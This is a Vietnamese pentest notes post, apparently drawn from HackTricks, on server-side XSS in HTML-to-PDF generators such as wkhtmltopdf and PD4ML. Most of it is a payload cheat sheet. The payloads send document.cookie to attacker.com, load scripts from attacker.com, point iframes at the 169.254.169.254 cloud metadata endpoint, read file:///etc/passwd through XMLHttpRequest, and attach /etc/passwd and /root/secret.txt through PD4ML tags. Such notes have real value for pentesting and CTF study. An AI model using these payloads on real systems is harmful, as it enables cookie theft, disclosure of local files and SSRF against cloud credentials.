---
title: Server Side XSS (Dynamic PDF)
date: 2023-08-30 16:00:00 +0700
categories: [SSRF]
tags: [html2pdf, ssx]     # TAG names should always be lowercase
img_path: /assets/img/ServerSideXSS
---

Refs: <https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf>

# Server Side XSS (Dynamic PDF)
Khi web tạo file PDF sử dụng input từ người dùng, ta có thể đánh lừa chúng bằng cách cho nó thực thi `JS` code, hoặc cũng có thể từ các tag `HTML`,...<br>
Và khi gen thành công file PDF, dữ liệu không render ra thì cần phải extract file đó hoặc dùng 1 số kỹ thuật liên quan.
## Popular PDF generation
- <a href="https://github.com/wkhtmltopdf/wkhtmltopdf">wkhtmltopdf</a>: Đây là công cụ sử dụng mã nguồn mở kết hợp với *Webkit rendering engine* để chuyển từ `HTML` và `CSS` sang `PDF`.
- <a href="https://github.com/tecnickcom/tcpdf">TCPDF</a>: Đây là thư viên `PHP` hỗ trợ nhiều tính năng như images, graphics, encryption.
- <a href="https://github.com/foliojs/pdfkit">PDFKit </a>: Đây là thư việc cua NodeJS tạo `PDF`từ `HTML` và `CSS`.
- <a href="https://github.com/itext">iText</a>: Là thư viện dựa trên `Java` để tạo `PDF` hỗ trợ nhiều tính năng như *digital signature* và *form filling*.
- <a href="https://github.com/Setasign/FPDF">FPDF</a>: Thư viện của `PHP` tạo `PDF` với đặc điểm nhẹ và dễ sử dụng.
- <a href="https://github.com/dompdf/dompdf">dompdf</a>: Thư việc `PHP` chuyển `HTML` sang `PDF`.
- <a href="https://github.com/Kozea/WeasyPrint">WeasyPrint</a>: Thư viện `Python` tạo `PDF` từ `HTML`.

![SSRF_PDF](SSRF_PDF.png)

## Payloads
### Discover
```
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">
```
### SVG
```
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script type="text/javascript">
    // <![CDATA[
      alert(1);
   // ]]>
  </script>
</svg>
```
**Other SVG payloads**: <https://github.com/allanlw/svg-cheatsheet>
### Path disclosure
```
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```
### Load an external script
```
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```
### Read local file / SSRF

```
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```
<script>
    xhzeem = new XMLHttpRequest();
    xhzeem.onload = function(){document.write(this.responseText);}
    xhzeem.onerror = function(){document.write('failed!')}
    xhzeem.open("GET","file:///etc/passwd");
    xhzeem.send();
</script>
```

```
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd"> 
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

```
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

> Có thể thay `file:///etc/passwd` thành `http://attacker.com/latest/user-data` để access từ **external web page (SSRF)**.
> Nếu SSRF bị filter `IP` hay `domain` có thể tham khảo ở <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass">đây</a>.
{: .prompt-warning }


### SSRF
#### Attachments: PD4ML
Có một số công cụ `PDF to HTML` cho phép chỉ định attachment cho tệp PDF, như `PD4ML`. Lạm dụng tính năng này để attach `local file` vào `PDF`. Để mở hay extract để được attachments đó có thể dùng **Firefox** double click vào biểu tưởng *cái ghim* hoặc có thể dùng tool như *pdfdetach* trên linux.
#### Payloads:
```
<link rel=attachment href="file:///root/secret.txt">
<a rel=attachment href="file:///root/secret.txt" />
```
**PD4ML**:
```
<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
<html><pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip"/></html>
```
## Refs
- <https://blog.dixitaditya.com/xss-to-read-internal-files>
- <https://medium.com/r3d-buck3t/xss-to-exfiltrate-data-from-pdfs-f5bbb35eaba7>
- <https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/>
- <https://lbherrera.github.io/lab/h1415-ctf-writeup.html#Reading-a-PDF>
- <https://blog.shoebpatel.com/2020/03/23/FireShell-CTF-2020-Write-up/>

